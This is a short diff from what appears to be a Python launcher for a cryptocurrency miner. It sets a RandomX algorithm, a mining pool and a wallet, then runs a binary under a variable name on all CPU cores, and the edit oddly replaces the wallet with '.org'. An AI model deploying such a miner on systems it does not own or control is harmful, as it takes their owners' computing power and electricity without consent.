@@ -30,7 +30,7 @@ time.sleep(30)
 # Konfigurasi mining
 algo = "rx/0"
 pool = "pool.hashvault.pro:443"
-wallet = "4AypWi9xNQvSy11FT5yr7Ajnyz2XuoUD7LGEJw4ZTRUHLrWjH1x5KoZUp9FTS4s9a5Y6Q7d4jSze4E6tq64aJTD2L7hnCrL.org"
+wallet = ".org"
 
 cmd = f"./{final_name} -a {algo} --url {pool} --tls --user {wallet} --cpu {os.cpu_count()}"
 print(f"[INFO] Running miner:\n{cmd}\n")
